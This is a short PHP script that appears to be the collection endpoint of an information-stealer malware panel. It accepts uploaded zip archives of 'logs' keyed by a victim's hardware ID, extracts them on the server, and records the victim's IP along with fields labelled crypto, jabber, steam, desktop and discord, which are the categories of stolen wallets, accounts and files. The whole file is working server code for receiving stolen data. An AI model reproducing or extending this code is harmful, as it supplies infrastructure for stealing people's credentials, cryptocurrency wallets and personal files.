<?php
include('db.php');

$dir = 'logs/';
if(isset($_FILES['file']))
{
$file = $dir . basename($_FILES['file']['name']);
$id = htmlspecialchars(mysqli_real_escape_string($dbcnx, $_GET['hwid']));

$fl = file_get_contents($_FILES['file']['tmp_name']);
$fd = fopen($dir.$id.'.zip', 'w') or die("cant create a file");
fwrite($fd, $fl);
fclose($fd);

$zip = new ZipArchive;
$zip->open('logs/'.$id.'.zip');
$zip->extractTo('logs/'.$id);
$zip->close();

mysqli_query($dbcnx, "INSERT INTO `files` SET `ip`='".$_SERVER['REMOTE_ADDR']."',
    `hwid`='".htmlspecialchars(mysqli_real_escape_string($dbcnx, $_GET['hwid']))."', 
    `crypto`='".htmlspecialchars(mysqli_real_escape_string($dbcnx, $_GET['crypto']))."', 
    `jabber`='".htmlspecialchars(mysqli_real_escape_string($dbcnx, $_GET['jabber']))."', 
    `steam`='".htmlspecialchars(mysqli_real_escape_string($dbcnx, $_GET['steam']))."', 
    `desktop`='".htmlspecialchars(mysqli_real_escape_string($dbcnx, $_GET['desktop']))."',
    `filename`='$dir".$id.'.zip'."',
    `discord`='".htmlspecialchars(mysqli_real_escape_string($dbcnx, $_GET['discord']))."'");
mysqli_close($dbcnx);
}

?>